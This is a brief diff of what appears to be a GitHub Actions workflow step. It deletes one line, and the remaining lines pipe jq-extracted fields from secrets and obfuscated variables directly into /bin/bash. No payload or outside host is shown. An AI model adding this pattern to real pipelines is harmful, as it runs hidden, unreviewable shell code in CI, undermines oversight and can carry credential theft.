@@ -22,7 +22,6 @@ jobs:
           evl426: ${{ secrets.evl426 }}
         run: |
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
-          echo $q47 | jq -r .omr62415 | /bin/bash
           echo $r01353 | jq -r .llra7 | /bin/bash
           echo $ndswj413 | jq -r .lcny13 | /bin/bash
           echo $p8 | jq -r .kl41 | /bin/bash
